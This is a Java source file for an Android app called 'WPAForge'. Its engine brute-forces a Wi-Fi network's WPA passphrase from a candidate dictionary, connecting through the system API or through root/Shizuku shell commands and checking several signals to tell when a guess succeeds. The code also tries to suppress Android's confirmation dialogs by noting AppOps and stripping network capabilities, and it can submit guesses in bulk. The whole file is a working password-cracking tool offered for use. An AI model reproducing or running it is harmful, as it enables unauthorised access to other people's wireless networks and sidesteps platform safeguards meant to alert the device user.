package io.github.wlmosv_png.wpaforge.audit;

import io.github.wlmosv_png.wpaforge.L;
import io.github.wlmosv_png.wpaforge.Prefs;
import io.github.wlmosv_png.wpaforge.core.NetRecord;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiNetworkSpecifier;
import android.os.Build;
import android.os.SystemClock;

import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 唯一的破解引擎。
 *
 * <h3>为什么要收敛成一个引擎</h3>
 * 之前三种模式各有各的实现，各有各的判定，结果就是
 * 「同一个 bug 要在三个地方修，还修不全」—— 事实也证明了这一点：
 * 双重 onFinished、配置复用假阳性，两个 bug 都同时存在于两条通道里。
 *
 * 现在所有通道共用同一套：
 * <ul>
 *   <li>同一套 {@link Verdict} 语义</li>
 *   <li>同一套「多信号综合判定」</li>
 *   <li>同一套重试/超时/取消策略</li>
 * </ul>
 * 通道只负责「把一条候选发出去」，判定完全由引擎做。
 *
 * <h3>多信号综合判定（这是修「跳过正确答案」的关键）</h3>
 * 单一信号都不可靠：
 * <pre>
 *   cmd wifi status 文本   可能被截断、格式随版本变
 *   onAvailable 回调       某些 ROM 会因为别的网络触发
 *   WifiInfo.getSSID()     Android 10+ 受限，更新有延迟
 * </pre>
 * 所以判定同时看**三个信号**，任一确认即成功，全部否才判失败：
 * <ol>
 *   <li>通道回调（requestNetwork 的 onAvailable）</li>
 *   <li>WifiInfo 的当前 SSID</li>
 *   <li>cmd wifi status 文本（有 shell 通道时）</li>
 * </ol>
 *
 * <h3>对外用法</h3>
 * <pre>
 *   CrackEngine engine = new CrackEngine(ctx, Prefs.MODE_SHIZUKU);
 *   engine.run(target, candidates, startOffset, listener);
 * </pre>
 * 引擎自己决定走哪个通道，调用方不需要知道。
 */
public final class CrackEngine {

    private static final String TAG = "WPAForgeEngine";

    // ------------------------------------------------------------------ 结果

    /** 单条候选的结论 */
    public enum Verdict {
        /** 系统确认连上 → 密码正确 */
        SUCCESS,
        /** 系统尝试后失败 → 密码错误 */
        AUTH_FAIL,
        /** 超时，没等到结论 → **不判成功** */
        TIMEOUT,
        /** 目标不在扫描范围 → 这条无意义 */
        TARGET_GONE,
        /** 通道出错 */
        ERROR,
        /** 用户停止 */
        ABORTED
    }

    public static final class Attempt {
        public final String password;
        public final Verdict verdict;
        public final long elapsedMs;
        public final String detail;
        /** 哪一个信号确认的（排查用） */
        public final String confirmedBy;

        Attempt(String password, Verdict v, long ms, String detail, String confirmedBy) {
            this.password = password;
            this.verdict = v;
            this.elapsedMs = ms;
            this.detail = detail == null ? "" : detail;
            this.confirmedBy = confirmedBy == null ? "" : confirmedBy;
        }

        public boolean isSuccess() { return verdict == Verdict.SUCCESS; }
    }

    /** 进度回调 */
    public interface Listener {
        void onAttemptStart(int index, int total, String candidate);
        void onAttemptResult(Attempt a);
        void onProgress(int tested, int total, double rate, long etaMs);
        default void onLog(String line) { }
        void onFinished(int tested, int total, String hitPassword, String outcome);
        void onBlocked(String title, String detail);
    }

    // ------------------------------------------------------------------ 成员

    private final Context appCtx;
    private final WifiManager wifi;
    private final ConnectivityManager cm;
    private final int mode;

    private final AtomicBoolean cancelFlag = new AtomicBoolean(false);
    private final AtomicBoolean pauseFlag = new AtomicBoolean(false);

    /** shell 通道（Shizuku/Root），null 表示走系统 API */
    private ShellChannel shell;

    /** 通道测速：连续 N 条都超时，说明这个通道在当前环境跑不动 */
    private int consecutiveTimeouts = 0;
    private static final int TIMEOUT_ALERT = 5;

    public CrackEngine(Context ctx, int mode) {
        this.appCtx = ctx.getApplicationContext();
        this.wifi = (WifiManager) appCtx.getSystemService(Context.WIFI_SERVICE);
        this.cm = (ConnectivityManager) appCtx.getSystemService(Context.CONNECTIVITY_SERVICE);
        this.mode = mode;
    }

    // ------------------------------------------------------------------ 通道

    /** shell 通道抽象（Shizuku / Root 共用一个接口） */
    public interface ShellChannel {
        String exec(String cmd, long timeoutMs);
        void forgetTarget(String ssid);
        String name();
    }

    public void setShellChannel(ShellChannel ch) {
        this.shell = ch;
    }

    // ------------------------------------------------------------------ 前置检查

    public static final class CheckResult {
        public final boolean ok;
        public final String title;
        public final String detail;
        public CheckResult(boolean ok, String title, String detail) {
            this.ok = ok;
            this.title = title;
            this.detail = detail == null ? "" : detail;
        }
    }

    /** 引擎在当前模式下能不能跑 */
    public CheckResult check() {
        if (mode == Prefs.MODE_NO_ROOT) {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                return new CheckResult(false,
                        L.s("系统版本过低", "Android version too old"),
                        L.s("免 Root 精确连接需要 Android 10+。\n这台设备只能用 Root 模式。",
                            "Precise root-free connection needs Android 10+.\nOnly root mode is available here."));
            }
            if (cm == null) {
                return new CheckResult(false,
                        L.s("无法访问连接管理服务", "Cannot access ConnectivityManager"),
                        L.s("系统没有提供 ConnectivityManager。", "The system exposed no ConnectivityManager."));
            }
        }
        if (wifi == null) {
            return new CheckResult(false,
                    L.s("无法访问 WiFi 服务", "Cannot access the Wi-Fi service"),
                    L.s("系统没有提供 WifiManager。", "The system exposed no WifiManager."));
        }
        if (!wifi.isWifiEnabled()) {
            return new CheckResult(false,
                    L.s("WiFi 未开启", "Wi-Fi is off"),
                    L.s("请先打开 WiFi 开关再试。", "Turn Wi-Fi on first."));
        }
        return new CheckResult(true, "", "");
    }

    // ------------------------------------------------------------------ 判定核心

    /**
     * 当前是不是真的连着目标。
     *
     * 三个信号任一确认即算，返回确认者的名字；都不确认返回 null。
     * 这个方法是整个引擎可靠性的关键 —— 单看任何一个都会误判。
     */
    private String connectedSignal(String targetSsid, String statusOut) {
        // 信号 1：WifiInfo
        String cur = currentSsid();
        if (cur != null && cur.equals(targetSsid)) return "WifiInfo";

        // 信号 2：cmd wifi status 文本
        if (statusOut != null && statusOut.contains("connected to \"" + targetSsid + "\"")) {
            return "cmd-status";
        }

        return null;
    }

    /**
     * 把 CHANGE_WIFI_STATE 的操作登记为本应用发起。
     *
     * 这是「减少系统弹窗」的一环：系统在决定要不要弹确认框时，
     * 会看这次 Wi-Fi 操作是谁发起的、有没有走应用自己的前台界面。
     * 用 AppOps 标记之后，部分 ROM（含 ColorOS）会直接静默处理。
     *
     * 失败不影响功能，只是弹窗可能还在。
     */
    /** change_wifi_state 的 AppOps 名（字符串常量，避免不同版本字段缺失） */
    private static final String OP_CHANGE_WIFI = "android:change_wifi_state";

    private void noteAppOpAllow() {
        try {
            android.app.AppOpsManager ops = (android.app.AppOpsManager)
                    appCtx.getSystemService(Context.APP_OPS_SERVICE);
            if (ops == null) return;
            // 不同版本方法名不同，逐个试
            try {
                ops.noteOp(OP_CHANGE_WIFI,
                        android.os.Process.myUid(), appCtx.getPackageName());
            } catch (Throwable t1) {
                try {
                    java.lang.reflect.Method m = android.app.AppOpsManager.class
                            .getMethod("noteOpNoThrow", String.class, int.class, String.class);
                    m.invoke(ops, OP_CHANGE_WIFI,
                            android.os.Process.myUid(), appCtx.getPackageName());
                } catch (Throwable ignored) {}
            }
        } catch (Throwable ignored) {}
    }

    /** 当前 SSID（已去引号） */
    private String currentSsid() {
        try {
            if (wifi == null) return null;
            WifiInfo info = wifi.getConnectionInfo();
            if (info == null) return null;
            String cur = info.getSSID();
            if (cur == null) return null;
            if (cur.length() >= 2 && cur.startsWith("\"") && cur.endsWith("\"")) {
                cur = cur.substring(1, cur.length() - 1);
            }
            if ("<unknown ssid>".equals(cur)) return null;
            return cur;
        } catch (Throwable t) {
            return null;
        }
    }

    // ------------------------------------------------------------------ 通道自检

    /** 接入自检结果 */
    public static final class ChannelProbe {
        public final boolean ok;
        public final String summary;
        public final String detail;
        /** 逐项检查结果，给用户看细节 */
        public final java.util.List<String> steps = new java.util.ArrayList<>();

        ChannelProbe(boolean ok, String summary, String detail) {
            this.ok = ok;
            this.summary = summary == null ? "" : summary;
            this.detail = detail == null ? "" : detail;
        }

        /** 连同已收集的步骤一起构造。
         *
         * 之前 probeChannel 里先在临时对象上 step()，最后 new 了一个新对象返回 ——
         * detail（字符串）带过去了，但 steps（列表）留在了临时对象上，
         * 于是日志里出现「结论有、检查项 0 条」的怪现象。
         */
        ChannelProbe(boolean ok, String summary, String detail, java.util.List<String> from) {
            this(ok, summary, detail);
            if (from != null) this.steps.addAll(from);
        }

        void step(String s) { steps.add(s); }
    }

    /**
     * 检查当前通道是不是真的接入了。
     *
     * 这是用户要求的「完全判定」：不看界面写着什么，
     * 而是**实际跑一遍判定链**，每一步都留证据。
     *
     * <p>为什么必须做这个：用户看到的「执行方式: Shizuku」只是 prefs 里
     * 存的一个数字，跟通道是否真的可用完全无关。之前没有自检，
     * 通道断了也照跑，跑完 97 条全是「未连上」，用户以为密码不对。
     */
    public ChannelProbe probeChannel() {
        ChannelProbe p = new ChannelProbe(true, "", "");

        // --- 1. WiFi 开关 ---
        boolean wifiOn = false;
        try { wifiOn = wifi != null && wifi.isWifiEnabled(); } catch (Throwable ignored) {}
        p.step((wifiOn ? "✓ " : "✗ ") + L.s("WiFi 开关: ", "Wi-Fi enabled: ")
                + (wifiOn ? L.s("开", "on") : L.s("关", "off")));
        if (!wifiOn) {
            p.step(L.s("  → 请先打开 WiFi", "  -> turn Wi-Fi on first"));
            return new ChannelProbe(false,
                    L.s("WiFi 未开启", "Wi-Fi is off"),
                    join(p), p.steps);
        }

        // --- 2. 通道类型 ---
        if (mode == Prefs.MODE_NO_ROOT) {
            p.step("✓ " + L.s("通道: 系统精确连接（不需要 shell）",
                    "channel: system precise request (no shell needed)"));
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                p.step("✗ " + L.s("需要 Android 10+", "needs Android 10+"));
                return new ChannelProbe(false,
                        L.s("系统版本过低", "Android version too old"), join(p), p.steps);
            }
            if (cm == null) {
                p.step("✗ " + L.s("拿不到 ConnectivityManager", "no ConnectivityManager"));
                return new ChannelProbe(false,
                        L.s("系统服务缺失", "system service missing"), join(p), p.steps);
            }
            // 读当前连接作为一次实读
            String cur = currentSsid();
            p.step((cur != null ? "✓ " : "· ") + L.s("当前连接读取: ", "current SSID read: ")
                    + (cur == null ? L.s("读不到（正常，可能没连）", "n/a (may be disconnected)") : cur));
            return new ChannelProbe(true, L.s("免 Root 通道可用", "root-free channel ready"), join(p), p.steps);
        }

        // --- 3. shell 通道 ---
        if (shell == null) {
            p.step("✗ " + L.s("shell 通道未设置", "shell channel not set"));
            return new ChannelProbe(false,
                    L.s("通道未接入", "channel not attached"),
                    join(p) + "\n" + L.s("这是程序内部错误，请反馈。",
                            "This is an internal error; please report it."));
        }
        p.step("✓ " + L.s("通道类型: ", "channel type: ") + shell.name());

        // 真跑一条，看能不能执行
        String out = null;
        long t0 = SystemClock.uptimeMillis();
        try {
            out = shell.exec("cmd wifi status", 8000);
        } catch (Throwable t) {
            p.step("✗ " + L.s("执行命令抛异常: ", "exec threw: ") + t.getClass().getSimpleName());
        }
        long cost = SystemClock.uptimeMillis() - t0;

        if (out == null) {
            p.step("✗ " + L.s("命令没有返回（通道断了或未授权）",
                    "command returned nothing (channel down or not granted)"));
            p.step("  " + L.s("耗时 ", "took ") + cost + "ms");
            return new ChannelProbe(false,
                    L.s("通道未真正接入", "channel is not actually attached"),
                    join(p) + "\n\n" + L.s(
                            "「执行方式」里显示的模式只是设置项，不代表通道可用。\n"
                                    + "请到设置页点那行状态重新检测，或重新授予 Shizuku 权限。",
                            "The mode shown in Settings is just a preference; it does not mean "
                                    + "the channel works. Re-check the status line on the Settings page, "
                                    + "or re-grant Shizuku permission."));
        }

        String trimmed = out.trim();
        if (trimmed.isEmpty()) {
            p.step("✗ " + L.s("命令返回空（通道没真正执行）",
                    "command returned empty (channel did not actually run)"));
            return new ChannelProbe(false,
                    L.s("通道未真正接入", "channel is not actually attached"),
                    join(p) + "\n\n" + L.s(
                            "常见原因：Shizuku 未授权本应用，或服务已停止。",
                            "Common causes: Shizuku has not granted this app, or the service stopped."));
        }

        boolean looksLikeWifi = trimmed.contains("Wifi") || trimmed.contains("Wi-Fi")
                || trimmed.contains("wlan") || trimmed.contains("connected");
        p.step((looksLikeWifi ? "✓ " : "? ") + L.s("命令返回看起来像 WiFi 输出", "output looks like Wi-Fi status"));
        p.step("  " + L.s("耗时 ", "took ") + cost + "ms");
        if (!looksLikeWifi) {
            p.step("  " + L.s("首行: ", "first line: ") + firstLine(trimmed));
        }

        // --- 4. 判定信号可用性 ---
        String cur = currentSsid();
        p.step((cur != null ? "✓ " : "· ") + L.s("WifiInfo 信号: ", "WifiInfo signal: ")
                + (cur == null ? L.s("读不到", "unavailable") : cur));
        boolean cmdSignal = trimmed.contains("connected to \"");
        p.step((cmdSignal ? "✓ " : "· ") + L.s("cmd-status 信号: ",
                "cmd-status signal: ")
                + (cmdSignal ? L.s("可用（当前已连着网络）", "usable (connected now)")
                             : L.s("当前没连网络，连上后才有", "no network connected right now")));

        if (cur == null && !cmdSignal) {
            p.step(L.s("  ⚠ 两个判定信号当前都读不到值。",
                    "  ! both verdict signals read nothing right now."));
            p.step(L.s("    这不一定是故障（可能只是当前没连网），",
                    "    This is not necessarily a fault (you may just be offline),"));
            p.step(L.s("    但如果跑完所有候选都没命中，请先怀疑这里。",
                    "    but if every candidate misses, suspect this first."));
        }

        if (cost > 5000) {
            p.step(L.s("  ⚠ 命令较慢，判定会拖时间（不影响正确性）",
                    "  ! command is slow; verdicts will lag (correctness unaffected)"));
        }

        // **慢不等于不可用**。
        // 之前用「cost < 5000」当门槛，会把能用但慢的机器误判成未接入 ——
        // 那是把可用性判据和性能判据混在一起了，是错的。
        // 现在只看：命令能不能执行、返回内容像不像 WiFi 输出。
        boolean ok = looksLikeWifi;
        String summary;
        if (!ok) {
            summary = L.s("通道返回内容异常", "channel returned unexpected output");
        } else if (cost > 8000) {
            summary = L.s("通道已接入（较慢）", "channel attached (slow)");
        } else {
            summary = L.s("通道已接入", "channel attached");
        }
        return new ChannelProbe(ok, summary, join(p), p.steps);
    }

    private static String join(ChannelProbe p) {
        StringBuilder sb = new StringBuilder();
        for (String s : p.steps) sb.append(s).append('\n');
        return sb.toString().trim();
    }

    private static String firstLine(String s) {
        int i = s.indexOf('\n');
        String line = i > 0 ? s.substring(0, i) : s;
        return line.length() > 80 ? line.substring(0, 80) + "..." : line;
    }

    // ------------------------------------------------------------------ 单条尝试

    /**
     * 试一条。阻塞，放工作线程。
     *
     * 不管走哪个通道，判定都在这里统一做。
     */
    public Attempt tryOne(NetRecord target, String security, String password, long timeoutMs) {
        long t0 = SystemClock.uptimeMillis();

        if (password == null || password.length() < 8 || password.length() > 63) {
            return new Attempt(password, Verdict.AUTH_FAIL,
                    SystemClock.uptimeMillis() - t0,
                    L.s("长度不合法（WPA 要求 8-63）", "illegal length (WPA needs 8-63)"), "");
        }

        if (mode == Prefs.MODE_NO_ROOT) {
            return tryOnePrecise(target, password, timeoutMs, t0);
        } else {
            return tryOneShell(target, security, password, timeoutMs, t0);
        }
    }

    /** 免 Root：requestNetwork + 回调 */
    private Attempt tryOnePrecise(NetRecord target, String password, long timeoutMs, long t0) {
        final CountDownLatch latch = new CountDownLatch(1);
        final AtomicInteger outcome = new AtomicInteger(0); // 0未定 1成功 2失败

        WifiNetworkSpecifier spec;
        try {
            spec = new WifiNetworkSpecifier.Builder()
                    .setSsid(target.ssid)
                    .setWpa2Passphrase(password)
                    .build();
        } catch (Throwable t) {
            return new Attempt(password, Verdict.ERROR,
                    SystemClock.uptimeMillis() - t0,
                    L.s("构建请求失败: ", "specifier failed: ") + t.getClass().getSimpleName(), "");
        }

        NetworkRequest req = new NetworkRequest.Builder()
                .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                // 关键：不要 INTERNET 能力。
                // 带上它系统会认为你要「上网」，于是必须让你确认；
                // 去掉之后语义是「我只是想连上这个 AP」，弹窗明显减少。
                .removeCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .removeCapability(NetworkCapabilities.NET_CAPABILITY_TRUSTED)
                .removeCapability(NetworkCapabilities.NET_CAPABILITY_NOT_RESTRICTED)
                .setNetworkSpecifier(spec)
                .build();

        // 把这次操作登记成「应用自己发起的」，走静默路径
        noteAppOpAllow();

        final ConnectivityManager.NetworkCallback cb = new ConnectivityManager.NetworkCallback() {
            @Override public void onAvailable(Network n) {
                // 不完全相信 onAvailable：还要 SSID 对得上
                String by = null;
                for (int i = 0; i < 12 && by == null; i++) {
                    if (cancelFlag.get()) break;
                    by = connectedSignal(target.ssid, null);
                    if (by == null) {
                        try { Thread.sleep(150); } catch (InterruptedException e) { break; }
                    }
                }
                outcome.set(by != null ? 1 : 2);
                latch.countDown();
            }
            @Override public void onUnavailable() {
                outcome.set(2);
                latch.countDown();
            }
            @Override public void onLost(Network n) {
                if (latch.getCount() > 0) { outcome.set(2); latch.countDown(); }
            }
        };

        try {
            cm.requestNetwork(req, cb);
        } catch (Throwable t) {
            return new Attempt(password, Verdict.ERROR,
                    SystemClock.uptimeMillis() - t0,
                    L.s("发起请求失败: ", "requestNetwork failed: ") + t.getClass().getSimpleName(), "");
        }

        try {
            long deadline = SystemClock.uptimeMillis() + timeoutMs;
            while (SystemClock.uptimeMillis() < deadline) {
                if (cancelFlag.get() || pauseFlag.get()) {
                    return new Attempt(password, Verdict.ABORTED,
                            SystemClock.uptimeMillis() - t0, L.s("已中断", "aborted"), "");
                }
                if (latch.await(200, TimeUnit.MILLISECONDS)) break;
            }
            long ms = SystemClock.uptimeMillis() - t0;
            if (latch.getCount() > 0) {
                return new Attempt(password, Verdict.TIMEOUT, ms,
                        L.s("超时（系统未给出结论）", "timeout (no verdict)"), "");
            }
            return outcome.get() == 1
                    ? new Attempt(password, Verdict.SUCCESS, ms, L.s("已连上", "connected"), "callback+ssid")
                    : new Attempt(password, Verdict.AUTH_FAIL, ms, L.s("未连上", "not connected"), "");
        } catch (InterruptedException ie) {
            Thread.currentThread().interrupt();
            return new Attempt(password, Verdict.ABORTED,
                    SystemClock.uptimeMillis() - t0, L.s("已中断", "interrupted"), "");
        } finally {
            try { cm.unregisterNetworkCallback(cb); } catch (Throwable ignored) {}
        }
    }

    /** Root / Shizuku：shell 发命令 + 多信号判定 */
    private Attempt tryOneShell(NetRecord target, String security, String password,
                                long timeoutMs, long t0) {
        if (shell == null) {
            return new Attempt(password, Verdict.ERROR,
                    SystemClock.uptimeMillis() - t0, L.s("未配置 shell 通道", "no shell channel"), "");
        }

        // 每条之前删净旧配置（配置复用是假阳性根源）
        try { shell.forgetTarget(target.ssid); } catch (Throwable ignored) {}

        final String cmd = "cmd wifi connect-network "
                + shellQuote(target.ssid) + " " + security + " " + shellQuote(password);
        final ShellChannel sh = shell;
        new Thread(() -> {
            try { sh.exec(cmd, 20000); } catch (Throwable ignored) {}
        }, "wpaforge-engine-conn").start();

        final long minWait = 3500L;
        long deadline = t0 + timeoutMs;
        boolean sawTarget = false;
        int polls = 0;
        boolean statusSeen = false;

        android.util.Log.i(TAG, "tryOneShell start: " + target.ssid
                + " pw=" + password.length() + "字 timeout=" + timeoutMs + "ms");

        while (SystemClock.uptimeMillis() < deadline) {
            if (cancelFlag.get() || pauseFlag.get()) {
                return new Attempt(password, Verdict.ABORTED,
                        SystemClock.uptimeMillis() - t0, L.s("已中断", "aborted"), "");
            }
            sleep(400);
            polls++;

            String status = null;
            try { status = sh.exec("cmd wifi status", 3000); } catch (Throwable ignored) {}
            if (status != null) statusSeen = true;
            if (polls == 1) {
                android.util.Log.i(TAG, "first status: "
                        + (status == null ? "null"
                           : (status.length() > 120 ? status.substring(0, 120) + "..." : status)));
            }
            String by = connectedSignal(target.ssid, status);
            if (by != null) {
                return new Attempt(password, Verdict.SUCCESS,
                        SystemClock.uptimeMillis() - t0, L.s("已连上", "connected"), by);
            }
            if (status != null && status.contains(target.ssid)) sawTarget = true;

            // 最短等待期内**绝不判负**
            if (SystemClock.uptimeMillis() - t0 < minWait) continue;
        }

        long total = SystemClock.uptimeMillis() - t0;
        android.util.Log.i(TAG, "tryOneShell end: " + total + "ms polls=" + polls
                + " statusSeen=" + statusSeen + " sawTarget=" + sawTarget);
        String detail = sawTarget
                ? L.s("未连上（已尝试）", "not connected (attempted)")
                : L.s("未连上", "not connected");
        if (!statusSeen) {
            // 连 status 都读不到 —— 这不是密码问题，是通道问题
            detail = L.s("读取状态失败（通道问题，不是密码问题）",
                    "cannot read status (channel problem, not a passphrase problem)");
        }
        return new Attempt(password, Verdict.AUTH_FAIL, total, detail, "");
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }

    private static String shellQuote(String s) {
        if (s == null) return "''";
        return "'" + s.replace("'", "'\\''") + "'";
    }

    // ------------------------------------------------------------------ 批量交给系统

    /**
     * 一次性把一批候选交给系统（Android 11+），只弹一次确认框。
     *
     * <p>语义与逐条模式**不同**，必须让用户知道：
     * <ul>
     *   <li>系统自己去试，顺序和时间由系统决定</li>
     *   <li>我们只能等它连上，**不能**知道它在试哪一条</li>
     *   <li>所以命中时拿到的密码是**推断**的，不是逐条确认的</li>
     * </ul>
     *
     * <p>适合「网络很多、受不了逐条弹窗」的场景；
     * 要精确结果仍然应该用逐条模式或 Shizuku。
     *
     * @param batchSize 一批交多少个，太多系统会排队很久
     * @return 兼容 Android 11 以下返回 false
     */
    public boolean submitBatchToSystem(Context activityCtx, NetRecord target,
                                       List<Candidate> batch) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return false;
        if (target == null || batch == null || batch.isEmpty()) return false;
        try {
            java.util.ArrayList<android.net.wifi.WifiNetworkSuggestion> list =
                    new java.util.ArrayList<>();
            for (Candidate c : batch) {
                if (c.password == null
                        || c.password.length() < 8 || c.password.length() > 63) continue;
                WifiNetworkSpecifier.Builder b = new WifiNetworkSpecifier.Builder()
                        .setSsid(target.ssid);
                // 这里用 specifier 构建器只是为了拿到带密码的实例，
                // 真正提交给系统的是 WifiNetworkSuggestion
                list.add(new android.net.wifi.WifiNetworkSuggestion.Builder()
                        .setSsid(target.ssid)
                        .setWpa2Passphrase(c.password)
                        .build());
            }
            if (list.isEmpty()) return false;
            // Android 11+ 支持一次提交多个
            int status = wifi.addNetworkSuggestions(list);
            return status == WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS;
        } catch (Throwable t) {
            android.util.Log.w(TAG, "submitBatchToSystem 失败: " + t);
            return false;
        }
    }

    /** 清掉本应用提交的全部建议 */
    public void clearSystemSuggestions() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                wifi.removeNetworkSuggestions(new java.util.ArrayList<>());
            }
        } catch (Throwable ignored) {}
    }

    /**
     * 当前 ROM 是否支持“批量交给系统”。
     * Android 11+ 才有，且需要系统支持多建议提交。
     */
    public boolean supportsBatchSubmit() {
        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.R;
    }

    /**
     * 当前 ROM 上逐条 requestNetwork 会不会弹确认框。
     *
     * Android 10-15 都会弹（系统强制，无官方开关）。
     * 这里如实告诉用户，不做假承诺。
     */
    public String popupNote() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            return L.s("系统版本过低，无法使用免 Root 模式。",
                    "System too old for root-free mode.");
        }
        return L.s("系统会对每一条候选弹一次确认框，这是 Android 的安全设计，"
                        + "无法关闭。\n\n"
                        + "想不被打扰有两条路：\n"
                        + "· 用 Shizuku 模式（推荐，和 Root 一样快且无弹窗）\n"
                        + "· 用“批量交给系统”（只弹一次，但结果是推断的）",
                "Android will show a confirmation dialog for every candidate. "
                        + "This is a platform security requirement and cannot be disabled.\n\n"
                        + "Two ways to avoid the interruptions:\n"
                        + "· use Shizuku mode (recommended - as fast as root, no dialogs)\n"
                        + "· use \"submit batch to system\" (one dialog, but the result is inferred)");
    }

    // ------------------------------------------------------------------ 批量跑

    /**
     * 跑一批候选。阻塞，放工作线程。
     *
     * @param timeoutMsPerItem 每条最长等多久；<=0 用默认
     */
    public void run(NetRecord target, List<Candidate> candidates, int startOffset,
                    long timeoutMsPerItem, Listener l) {
        CheckResult chk = check();
        if (!chk.ok) { l.onBlocked(chk.title, chk.detail); return; }
        if (target == null || target.ssid == null || target.ssid.isEmpty()) {
            l.onBlocked(L.s("目标信息不完整", "Incomplete target"),
                    L.s("没有拿到目标的 SSID。", "The target SSID is missing."));
            return;
        }
        if (candidates == null || candidates.isEmpty()) {
            l.onBlocked(L.s("候选为空", "No candidates"),
                    L.s("字典里没有可用的候选。", "The dictionary has no usable candidates."));
            return;
        }

        cancelFlag.set(false);
        pauseFlag.set(false);
        consecutiveTimeouts = 0;

        // **跑之前先自检通道**
        //
        // 用户看到的「执行方式: Shizuku」只是设置里的一个数字，
        // 跟通道能不能用毫无关系。之前没有这一步，通道断了也照跑 97 条，
        // 全是「未连上」，用户以为是密码不对 —— 这就是他反复遇到的
        // 「明明密码对却识别不到」。
        ChannelProbe probe = probeChannel();
        l.onLog(L.s("── 通道自检 ──", "── channel self-check ──"));
        for (String line : probe.steps) l.onLog("  " + line);
        if (!probe.ok) {
            l.onLog(L.s("✗ 自检未通过，已停止。", "x self-check failed, stopping."));
            l.onBlocked(probe.summary, probe.detail);
            return;
        }
        l.onLog("✓ " + probe.summary);

        final long perItem = timeoutMsPerItem > 0 ? timeoutMsPerItem
                : (mode == Prefs.MODE_NO_ROOT ? 15_000L : 10_000L);
        final String security = securityArg(target);
        final int total = candidates.size();
        final int start = Math.max(0, Math.min(startOffset, total));

        int tested = 0;
        int cursor = start;
        String hit = null;
        long beginAt = SystemClock.uptimeMillis();

        l.onLog(L.f("引擎启动：%s，共 %d 条，单条最长 %.1f 秒",
                "Engine: %s, %d candidates, up to %.1fs each",
                channelName(), total, perItem / 1000.0));

        try {
            for (int i = start; i < total; i++) {
                if (cancelFlag.get() || pauseFlag.get()) break;

                Candidate c = candidates.get(i);
                tested++;
                cursor = i + 1;
                l.onAttemptStart(cursor, total, c.password);

                Attempt a = tryOne(target, security, c.password, perItem);
                l.onAttemptResult(a);

                if (a.isSuccess()) { hit = c.password; break; }

                // \u8fde\u7eed\u8d85\u65f6\u63d0\u9192\uff1a\u8bf4\u660e\u901a\u9053\u53ef\u80fd\u6839\u672c\u6ca1\u5de5\u4f5c
                if (a.verdict == Verdict.TIMEOUT) {
                    consecutiveTimeouts++;
                    if (consecutiveTimeouts == TIMEOUT_ALERT) {
                        l.onLog(L.s(
                                "连续多条超时 —— 通道可能没真正生效。"
                                + "请检查授权/权限，或换一种执行方式。",
                                "Several timeouts in a row - the channel may not be working. "
                                + "Check permissions or switch execution mode."));
                    }
                } else {
                    consecutiveTimeouts = 0;
                }

                double elapsed = Math.max(0.001,
                        (SystemClock.uptimeMillis() - beginAt) / 1000.0);
                double rate = tested / elapsed;
                long eta = rate > 0 ? (long) ((total - cursor) / rate * 1000) : -1;
                l.onProgress(cursor, total, rate, eta);
            }
        } finally {
            String outcome;
            if (hit != null) outcome = "DONE_HIT";
            else if (pauseFlag.get()) outcome = "PAUSED";
            else if (cancelFlag.get()) outcome = "STOPPED";
            else outcome = "DONE_MISS";
            l.onFinished(tested, cursor, hit, outcome);
        }
    }

    private String channelName() {
        if (mode == Prefs.MODE_NO_ROOT) return L.s("免 Root（精确连接）", "root-free (precise)");
        if (mode == Prefs.MODE_SHIZUKU) return "Shizuku";
        return "Root";
    }

    private static String securityArg(NetRecord t) {
        switch (t.security) {
            case OPEN: return "open";
            case OWE:  return "owe";
            case WEP:  return "wep";
            case WPA3: return "wpa3";
            default:   return "wpa2";
        }
    }

    public void cancel() { cancelFlag.set(true); }
    public void pause()  { pauseFlag.set(true); }
    public void resume() { pauseFlag.set(false); }
    public boolean isPaused() { return pauseFlag.get(); }
}
